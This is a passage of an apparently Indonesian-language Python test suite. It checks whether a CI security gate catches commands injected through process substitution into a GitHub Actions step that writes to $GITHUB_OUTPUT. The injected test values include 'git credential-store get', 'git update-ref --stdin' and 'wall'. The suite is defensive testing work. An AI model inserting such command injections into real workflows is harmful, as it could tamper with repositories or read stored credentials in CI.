            "suntikan aksi410 tidak menembak"
        with open(berkas_aksi410, "w", encoding="utf-8") as f:
            f.write(isi_baru410)
        rc, out = jalan(sub410,
                        [sys.executable, GERBANG, "--semua"])
        periksa("git update-ref --stdin: gerbang gagal (Audit 1206)", rc != 0)
        shutil.rmtree(sub410, ignore_errors=True)
        sub411 = klon(tmp, "sub411")
        berkas_aksi411 = os.path.join(
            sub411, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi411, encoding="utf-8") as f:
            isi_aksi411 = f.read()
        baris_aksi411 = [b for b in isi_aksi411.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru411 = isi_aksi411.replace(
                baris_aksi411,
                baris_aksi411.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(git name-rev --stdin; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru411 != isi_aksi411, \
            "suntikan aksi411 tidak menembak"
        with open(berkas_aksi411, "w", encoding="utf-8") as f:
            f.write(isi_baru411)
        rc, out = jalan(sub411,
                        [sys.executable, GERBANG, "--semua"])
        periksa("git name-rev --stdin: gerbang gagal (Audit 1206)", rc != 0)
        shutil.rmtree(sub411, ignore_errors=True)
        sub412 = klon(tmp, "sub412")
        berkas_aksi412 = os.path.join(
            sub412, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi412, encoding="utf-8") as f:
            isi_aksi412 = f.read()
        baris_aksi412 = [b for b in isi_aksi412.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru412 = isi_aksi412.replace(
                baris_aksi412,
                baris_aksi412.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(git notes add -F - HEAD; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru412 != isi_aksi412, \
            "suntikan aksi412 tidak menembak"
        with open(berkas_aksi412, "w", encoding="utf-8") as f:
            f.write(isi_baru412)
        rc, out = jalan(sub412,
                        [sys.executable, GERBANG, "--semua"])
        periksa("git notes add -F - HEAD: gerbang gagal (Audit 1207)", rc != 0)
        shutil.rmtree(sub412, ignore_errors=True)
        sub413 = klon(tmp, "sub413")
        berkas_aksi413 = os.path.join(
            sub413, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi413, encoding="utf-8") as f:
            isi_aksi413 = f.read()
        baris_aksi413 = [b for b in isi_aksi413.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru413 = isi_aksi413.replace(
                baris_aksi413,
                baris_aksi413.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(git add --pathspec-from-file=-; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru413 != isi_aksi413, \
            "suntikan aksi413 tidak menembak"
        with open(berkas_aksi413, "w", encoding="utf-8") as f:
            f.write(isi_baru413)
        rc, out = jalan(sub413,
                        [sys.executable, GERBANG, "--semua"])
        periksa("git add --pathspec-from-file=-: gerbang gagal (Audit 1207)", rc != 0)
        shutil.rmtree(sub413, ignore_errors=True)
        sub414 = klon(tmp, "sub414")
        berkas_aksi414 = os.path.join(
            sub414, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi414, encoding="utf-8") as f:
            isi_aksi414 = f.read()
        baris_aksi414 = [b for b in isi_aksi414.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru414 = isi_aksi414.replace(
                baris_aksi414,
                baris_aksi414.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(pr --columns 2; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru414 != isi_aksi414, \
            "suntikan aksi414 tidak menembak"
        with open(berkas_aksi414, "w", encoding="utf-8") as f:
            f.write(isi_baru414)
        rc, out = jalan(sub414,
                        [sys.executable, GERBANG, "--semua"])
        periksa("pr --columns 2: gerbang gagal (Audit 1208)", rc != 0)
        shutil.rmtree(sub414, ignore_errors=True)
        sub415 = klon(tmp, "sub415")
        berkas_aksi415 = os.path.join(
            sub415, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi415, encoding="utf-8") as f:
            isi_aksi415 = f.read()
        baris_aksi415 = [b for b in isi_aksi415.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru415 = isi_aksi415.replace(
                baris_aksi415,
                baris_aksi415.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(pr -n berkas.txt; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru415 != isi_aksi415, \
            "suntikan aksi415 tidak menembak"
        with open(berkas_aksi415, "w", encoding="utf-8") as f:
            f.write(isi_baru415)
        rc, out = jalan(sub415,
                        [sys.executable, GERBANG, "--semua"])
        periksa("pr -n berkas.txt: gerbang lolos (Audit 1208)", rc == 0)
        shutil.rmtree(sub415, ignore_errors=True)
        sub416 = klon(tmp, "sub416")
        berkas_aksi416 = os.path.join(
            sub416, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi416, encoding="utf-8") as f:
            isi_aksi416 = f.read()
        baris_aksi416 = [b for b in isi_aksi416.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru416 = isi_aksi416.replace(
                baris_aksi416,
                baris_aksi416.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(nl --section-delimiter xx; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru416 != isi_aksi416, \
            "suntikan aksi416 tidak menembak"
        with open(berkas_aksi416, "w", encoding="utf-8") as f:
            f.write(isi_baru416)
        rc, out = jalan(sub416,
                        [sys.executable, GERBANG, "--semua"])
        periksa("nl --section-delimiter xx: gerbang gagal (Audit 1209)", rc != 0)
        shutil.rmtree(sub416, ignore_errors=True)
        sub417 = klon(tmp, "sub417")
        berkas_aksi417 = os.path.join(
            sub417, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi417, encoding="utf-8") as f:
            isi_aksi417 = f.read()
        baris_aksi417 = [b for b in isi_aksi417.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru417 = isi_aksi417.replace(
                baris_aksi417,
                baris_aksi417.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(ptx -g 3; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru417 != isi_aksi417, \
            "suntikan aksi417 tidak menembak"
        with open(berkas_aksi417, "w", encoding="utf-8") as f:
            f.write(isi_baru417)
        rc, out = jalan(sub417,
                        [sys.executable, GERBANG, "--semua"])
        periksa("ptx -g 3: gerbang gagal (Audit 1210)", rc != 0)
        shutil.rmtree(sub417, ignore_errors=True)
        sub418 = klon(tmp, "sub418")
        berkas_aksi418 = os.path.join(
            sub418, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi418, encoding="utf-8") as f:
            isi_aksi418 = f.read()
        baris_aksi418 = [b for b in isi_aksi418.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru418 = isi_aksi418.replace(
                baris_aksi418,
                baris_aksi418.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(ptx -G berkas.txt; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru418 != isi_aksi418, \
            "suntikan aksi418 tidak menembak"
        with open(berkas_aksi418, "w", encoding="utf-8") as f:
            f.write(isi_baru418)
        rc, out = jalan(sub418,
                        [sys.executable, GERBANG, "--semua"])
        periksa("ptx -G berkas.txt: gerbang lolos (Audit 1210)", rc == 0)
        shutil.rmtree(sub418, ignore_errors=True)
        sub419 = klon(tmp, "sub419")
        berkas_aksi419 = os.path.join(
            sub419, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi419, encoding="utf-8") as f:
            isi_aksi419 = f.read()
        baris_aksi419 = [b for b in isi_aksi419.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru419 = isi_aksi419.replace(
                baris_aksi419,
                baris_aksi419.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(wall -t 5; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru419 != isi_aksi419, \
            "suntikan aksi419 tidak menembak"
        with open(berkas_aksi419, "w", encoding="utf-8") as f:
            f.write(isi_baru419)
        rc, out = jalan(sub419,
                        [sys.executable, GERBANG, "--semua"])
        periksa("wall -t 5: gerbang gagal (Audit 1211)", rc != 0)
        shutil.rmtree(sub419, ignore_errors=True)
        sub420 = klon(tmp, "sub420")
        berkas_aksi420 = os.path.join(
            sub420, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi420, encoding="utf-8") as f:
            isi_aksi420 = f.read()
        baris_aksi420 = [b for b in isi_aksi420.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru420 = isi_aksi420.replace(
                baris_aksi420,
                baris_aksi420.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(logger --id pesan; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru420 != isi_aksi420, \
            "suntikan aksi420 tidak menembak"
        with open(berkas_aksi420, "w", encoding="utf-8") as f:
            f.write(isi_baru420)
        rc, out = jalan(sub420,
                        [sys.executable, GERBANG, "--semua"])
        periksa("logger --id pesan: gerbang lolos (Audit 1212)", rc == 0)
        shutil.rmtree(sub420, ignore_errors=True)
        sub421 = klon(tmp, "sub421")
        berkas_aksi421 = os.path.join(
            sub421, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi421, encoding="utf-8") as f:
            isi_aksi421 = f.read()
        baris_aksi421 = [b for b in isi_aksi421.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru421 = isi_aksi421.replace(
                baris_aksi421,
                baris_aksi421.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(lzma -F lzma -c; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru421 != isi_aksi421, \
            "suntikan aksi421 tidak menembak"
        with open(berkas_aksi421, "w", encoding="utf-8") as f:
            f.write(isi_baru421)
        rc, out = jalan(sub421,
                        [sys.executable, GERBANG, "--semua"])
        periksa("lzma -F lzma -c: gerbang gagal (Audit 1213)", rc != 0)
        shutil.rmtree(sub421, ignore_errors=True)
        sub422 = klon(tmp, "sub422")
        berkas_aksi422 = os.path.join(
            sub422, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi422, encoding="utf-8") as f:
            isi_aksi422 = f.read()
        baris_aksi422 = [b for b in isi_aksi422.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru422 = isi_aksi422.replace(
                baris_aksi422,
                baris_aksi422.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(zcat --suffix .zz; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru422 != isi_aksi422, \
            "suntikan aksi422 tidak menembak"
        with open(berkas_aksi422, "w", encoding="utf-8") as f:
            f.write(isi_baru422)
        rc, out = jalan(sub422,
                        [sys.executable, GERBANG, "--semua"])
        periksa("zcat --suffix .zz: gerbang gagal (Audit 1213)", rc != 0)
        shutil.rmtree(sub422, ignore_errors=True)
        sub423 = klon(tmp, "sub423")
        berkas_aksi423 = os.path.join(
            sub423, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi423, encoding="utf-8") as f:
            isi_aksi423 = f.read()
        baris_aksi423 = [b for b in isi_aksi423.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru423 = isi_aksi423.replace(
                baris_aksi423,
                baris_aksi423.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(openssl dgst -list; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru423 != isi_aksi423, \
            "suntikan aksi423 tidak menembak"
        with open(berkas_aksi423, "w", encoding="utf-8") as f:
            f.write(isi_baru423)
        rc, out = jalan(sub423,
                        [sys.executable, GERBANG, "--semua"])
        periksa("openssl dgst -list: gerbang lolos (Audit 1214)", rc == 0)
        shutil.rmtree(sub423, ignore_errors=True)
        sub424 = klon(tmp, "sub424")
        berkas_aksi424 = os.path.join(
            sub424, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi424, encoding="utf-8") as f:
            isi_aksi424 = f.read()
        baris_aksi424 = [b for b in isi_aksi424.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru424 = isi_aksi424.replace(
                baris_aksi424,
                baris_aksi424.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(openssl enc -ciphers; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru424 != isi_aksi424, \
            "suntikan aksi424 tidak menembak"
        with open(berkas_aksi424, "w", encoding="utf-8") as f:
            f.write(isi_baru424)
        rc, out = jalan(sub424,
                        [sys.executable, GERBANG, "--semua"])
        periksa("openssl enc -ciphers: gerbang lolos (Audit 1214)", rc == 0)
        shutil.rmtree(sub424, ignore_errors=True)
        sub425 = klon(tmp, "sub425")
        berkas_aksi425 = os.path.join(
            sub425, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi425, encoding="utf-8") as f:
            isi_aksi425 = f.read()
        baris_aksi425 = [b for b in isi_aksi425.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru425 = isi_aksi425.replace(
                baris_aksi425,
                baris_aksi425.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(openssl x509 -in -; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru425 != isi_aksi425, \
            "suntikan aksi425 tidak menembak"
        with open(berkas_aksi425, "w", encoding="utf-8") as f:
            f.write(isi_baru425)
        rc, out = jalan(sub425,
                        [sys.executable, GERBANG, "--semua"])
        periksa("openssl x509 -in -: gerbang lolos (Audit 1215)", rc == 0)
        shutil.rmtree(sub425, ignore_errors=True)
        sub426 = klon(tmp, "sub426")
        berkas_aksi426 = os.path.join(
            sub426, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi426, encoding="utf-8") as f:
            isi_aksi426 = f.read()
        baris_aksi426 = [b for b in isi_aksi426.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru426 = isi_aksi426.replace(
                baris_aksi426,
                baris_aksi426.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(openssl x509; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru426 != isi_aksi426, \
            "suntikan aksi426 tidak menembak"
        with open(berkas_aksi426, "w", encoding="utf-8") as f:
            f.write(isi_baru426)
        rc, out = jalan(sub426,
                        [sys.executable, GERBANG, "--semua"])
        periksa("openssl x509: gerbang gagal (Audit 1215)", rc != 0)
        shutil.rmtree(sub426, ignore_errors=True)
        sub427 = klon(tmp, "sub427")
        berkas_aksi427 = os.path.join(
            sub427, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi427, encoding="utf-8") as f:
            isi_aksi427 = f.read()
        baris_aksi427 = [b for b in isi_aksi427.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru427 = isi_aksi427.replace(
                baris_aksi427,
                baris_aksi427.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(openssl pkcs7 -in -; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru427 != isi_aksi427, \
            "suntikan aksi427 tidak menembak"
        with open(berkas_aksi427, "w", encoding="utf-8") as f:
            f.write(isi_baru427)
        rc, out = jalan(sub427,
                        [sys.executable, GERBANG, "--semua"])
        periksa("openssl pkcs7 -in -: gerbang gagal (Audit 1215)", rc != 0)
        shutil.rmtree(sub427, ignore_errors=True)
        sub428 = klon(tmp, "sub428")
        berkas_aksi428 = os.path.join(
            sub428, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi428, encoding="utf-8") as f:
            isi_aksi428 = f.read()
        baris_aksi428 = [b for b in isi_aksi428.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru428 = isi_aksi428.replace(
                baris_aksi428,
                baris_aksi428.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(less -f --help; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru428 != isi_aksi428, \
            "suntikan aksi428 tidak menembak"
        with open(berkas_aksi428, "w", encoding="utf-8") as f:
            f.write(isi_baru428)
        rc, out = jalan(sub428, [sys.executable, GERBANG, "--semua"])
        periksa("less -f --help: "
                "gerbang lolos (Audit 1216)", rc == 0)
        shutil.rmtree(sub428, ignore_errors=True)
        sub429 = klon(tmp, "sub429")
        berkas_aksi429 = os.path.join(
            sub429, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi429, encoding="utf-8") as f:
            isi_aksi429 = f.read()
        baris_aksi429 = [b for b in isi_aksi429.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru429 = isi_aksi429.replace(
                baris_aksi429,
                baris_aksi429.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(patch -t --help; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru429 != isi_aksi429, \
            "suntikan aksi429 tidak menembak"
        with open(berkas_aksi429, "w", encoding="utf-8") as f:
            f.write(isi_baru429)
        rc, out = jalan(sub429, [sys.executable, GERBANG, "--semua"])
        periksa("patch -t --help: "
                "gerbang lolos (Audit 1217)", rc == 0)
        shutil.rmtree(sub429, ignore_errors=True)
        sub430 = klon(tmp, "sub430")
        berkas_aksi430 = os.path.join(
            sub430, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi430, encoding="utf-8") as f:
            isi_aksi430 = f.read()
        baris_aksi430 = [b for b in isi_aksi430.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru430 = isi_aksi430.replace(
                baris_aksi430,
                baris_aksi430.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(git check-mailmap -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru430 != isi_aksi430, \
            "suntikan aksi430 tidak menembak"
        with open(berkas_aksi430, "w", encoding="utf-8") as f:
            f.write(isi_baru430)
        rc, out = jalan(sub430, [sys.executable, GERBANG, "--semua"])
        periksa("git check-mailmap -: "
                "gerbang lolos (Audit 1218)", rc == 0)
        shutil.rmtree(sub430, ignore_errors=True)
        sub431 = klon(tmp, "sub431")
        berkas_aksi431 = os.path.join(
            sub431, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi431, encoding="utf-8") as f:
            isi_aksi431 = f.read()
        baris_aksi431 = [b for b in isi_aksi431.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru431 = isi_aksi431.replace(
                baris_aksi431,
                baris_aksi431.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(git check-mailmap --stdin -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru431 != isi_aksi431, \
            "suntikan aksi431 tidak menembak"
        with open(berkas_aksi431, "w", encoding="utf-8") as f:
            f.write(isi_baru431)
        rc, out = jalan(sub431, [sys.executable, GERBANG, "--semua"])
        periksa("git check-mailmap --stdin -: "
                "gerbang lolos (Audit 1219)", rc == 0)
        shutil.rmtree(sub431, ignore_errors=True)
        sub432 = klon(tmp, "sub432")
        berkas_aksi432 = os.path.join(
            sub432, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi432, encoding="utf-8") as f:
            isi_aksi432 = f.read()
        baris_aksi432 = [b for b in isi_aksi432.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru432 = isi_aksi432.replace(
                baris_aksi432,
                baris_aksi432.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(git credential-store --file get; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru432 != isi_aksi432, \
            "suntikan aksi432 tidak menembak"
        with open(berkas_aksi432, "w", encoding="utf-8") as f:
            f.write(isi_baru432)
        rc, out = jalan(sub432, [sys.executable, GERBANG, "--semua"])
        periksa("git credential-store --file get: "
                "gerbang lolos (Audit 1220)", rc == 0)
        shutil.rmtree(sub432, ignore_errors=True)
        sub433 = klon(tmp, "sub433")
        berkas_aksi433 = os.path.join(
            sub433, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi433, encoding="utf-8") as f:
            isi_aksi433 = f.read()
        baris_aksi433 = [b for b in isi_aksi433.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru433 = isi_aksi433.replace(
                baris_aksi433,
                baris_aksi433.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(git credential-store get; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru433 != isi_aksi433, \
            "suntikan aksi433 tidak menembak"
        with open(berkas_aksi433, "w", encoding="utf-8") as f:
            f.write(isi_baru433)
        rc, out = jalan(sub433, [sys.executable, GERBANG, "--semua"])
        periksa("git credential-store get: "
                "gerbang gagal (Audit 1220)", rc != 0)
        shutil.rmtree(sub433, ignore_errors=True)
        sub434 = klon(tmp, "sub434")
        berkas_aksi434 = os.path.join(
            sub434, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi434, encoding="utf-8") as f:
            isi_aksi434 = f.read()
        baris_aksi434 = [b for b in isi_aksi434.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru434 = isi_aksi434.replace(
                baris_aksi434,
                baris_aksi434.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(git am --exclude foo; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru434 != isi_aksi434, \
            "suntikan aksi434 tidak menembak"
        with open(berkas_aksi434, "w", encoding="utf-8") as f:
            f.write(isi_baru434)
        rc, out = jalan(sub434, [sys.executable, GERBANG, "--semua"])
        periksa("git am --exclude foo: "
                "gerbang gagal (Audit 1221)", rc != 0)
        shutil.rmtree(sub434, ignore_errors=True)
        sub435 = klon(tmp, "sub435")
        berkas_aksi435 = os.path.join(
            sub435, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi435, encoding="utf-8") as f:
            isi_aksi435 = f.read()
        baris_aksi435 = [b for b in isi_aksi435.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru435 = isi_aksi435.replace(
                baris_aksi435,
                baris_aksi435.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(git shortlog -w HEAD; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru435 != isi_aksi435, \
            "suntikan aksi435 tidak menembak"
        with open(berkas_aksi435, "w", encoding="utf-8") as f:
            f.write(isi_baru435)
        rc, out = jalan(sub435, [sys.executable, GERBANG, "--semua"])
        periksa("git shortlog -w HEAD: "
                "gerbang lolos (Audit 1222)", rc == 0)
        shutil.rmtree(sub435, ignore_errors=True)
        sub436 = klon(tmp, "sub436")
        berkas_aksi436 = os.path.join(
            sub436, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi436, encoding="utf-8") as f:
            isi_aksi436 = f.read()
        baris_aksi436 = [b for b in isi_aksi436.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru436 = isi_aksi436.replace(
                baris_aksi436,
                baris_aksi436.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(git shortlog --group author; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru436 != isi_aksi436, \
            "suntikan aksi436 tidak menembak"
        with open(berkas_aksi436, "w", encoding="utf-8") as f:
            f.write(isi_baru436)
        rc, out = jalan(sub436, [sys.executable, GERBANG, "--semua"])
        periksa("git shortlog --group author: "
                "gerbang gagal (Audit 1223)", rc != 0)
        shutil.rmtree(sub436, ignore_errors=True)
        sub437 = klon(tmp, "sub437")
        berkas_aksi437 = os.path.join(
            sub437, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi437, encoding="utf-8") as f:
            isi_aksi437 = f.read()
        baris_aksi437 = [b for b in isi_aksi437.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru437 = isi_aksi437.replace(
                baris_aksi437,
                baris_aksi437.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(git check-ignore --stdin berkas.txt; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru437 != isi_aksi437, \
            "suntikan aksi437 tidak menembak"
        with open(berkas_aksi437, "w", encoding="utf-8") as f:
            f.write(isi_baru437)
        rc, out = jalan(sub437, [sys.executable, GERBANG, "--semua"])
        periksa("git check-ignore --stdin berkas.txt: "
                "gerbang lolos (Audit 1224)", rc == 0)
        shutil.rmtree(sub437, ignore_errors=True)
        sub438 = klon(tmp, "sub438")
        berkas_aksi438 = os.path.join(
            sub438, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi438, encoding="utf-8") as f:
            isi_aksi438 = f.read()
        baris_aksi438 = [b for b in isi_aksi438.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru438 = isi_aksi438.replace(
                baris_aksi438,
                baris_aksi438.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(git notes add -F- HEAD; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru438 != isi_aksi438, \
            "suntikan aksi438 tidak menembak"
        with open(berkas_aksi438, "w", encoding="utf-8") as f:
            f.write(isi_baru438)
        rc, out = jalan(sub438, [sys.executable, GERBANG, "--semua"])
        periksa("git notes add -F- HEAD: "
                "gerbang gagal (Audit 1225)", rc != 0)
        shutil.rmtree(sub438, ignore_errors=True)
        sub439 = klon(tmp, "sub439")
        berkas_aksi439 = os.path.join(
            sub439, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi439, encoding="utf-8") as f:
            isi_aksi439 = f.read()
        baris_aksi439 = [b for b in isi_aksi439.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru439 = isi_aksi439.replace(
                baris_aksi439,
                baris_aksi439.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(git add --pathspec-from-file -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru439 != isi_aksi439, \
            "suntikan aksi439 tidak menembak"
        with open(berkas_aksi439, "w", encoding="utf-8") as f:
            f.write(isi_baru439)
        rc, out = jalan(sub439, [sys.executable, GERBANG, "--semua"])
        periksa("git add --pathspec-from-file -: "
                "gerbang gagal (Audit 1226)", rc != 0)
        shutil.rmtree(sub439, ignore_errors=True)
        sub440 = klon(tmp, "sub440")
        berkas_aksi440 = os.path.join(
            sub440, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi440, encoding="utf-8") as f:
            isi_aksi440 = f.read()
        baris_aksi440 = [b for b in isi_aksi440.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru440 = isi_aksi440.replace(
                baris_aksi440,
                baris_aksi440.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(git rev-list --pathspec-from-file=-; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru440 != isi_aksi440, \
            "suntikan aksi440 tidak menembak"
        with open(berkas_aksi440, "w", encoding="utf-8") as f:
            f.write(isi_baru440)
        rc, out = jalan(sub440, [sys.executable, GERBANG, "--semua"])
        periksa("git rev-list --pathspec-from-file=-: "
                "gerbang lolos (Audit 1227)", rc == 0)
        shutil.rmtree(sub440, ignore_errors=True)
        sub441 = klon(tmp, "sub441")
        berkas_aksi441 = os.path.join(
            sub441, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi441, encoding="utf-8") as f:
            isi_aksi441 = f.read()
        baris_aksi441 = [b for b in isi_aksi441.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru441 = isi_aksi441.replace(
                baris_aksi441,
                baris_aksi441.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(prlimit tail --pid 999999; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru441 != isi_aksi441, \
            "suntikan aksi441 tidak menembak"
        with open(berkas_aksi441, "w", encoding="utf-8") as f:
            f.write(isi_baru441)
        rc, out = jalan(sub441, [sys.executable, GERBANG, "--semua"])
        periksa("prlimit tail --pid 999999: "
                "gerbang gagal (Audit 1228)", rc != 0)
        shutil.rmtree(sub441, ignore_errors=True)
        sub442 = klon(tmp, "sub442")
        berkas_aksi442 = os.path.join(
            sub442, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi442, encoding="utf-8") as f:
            isi_aksi442 = f.read()
        baris_aksi442 = [b for b in isi_aksi442.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru442 = isi_aksi442.replace(
                baris_aksi442,
                baris_aksi442.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(prlimit --pid 999999; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru442 != isi_aksi442, \
            "suntikan aksi442 tidak menembak"
        with open(berkas_aksi442, "w", encoding="utf-8") as f:
            f.write(isi_baru442)
        rc, out = jalan(sub442, [sys.executable, GERBANG, "--semua"])
        periksa("prlimit --pid 999999: "
                "gerbang lolos (Audit 1228)", rc == 0)
        shutil.rmtree(sub442, ignore_errors=True)
        sub443 = klon(tmp, "sub443")
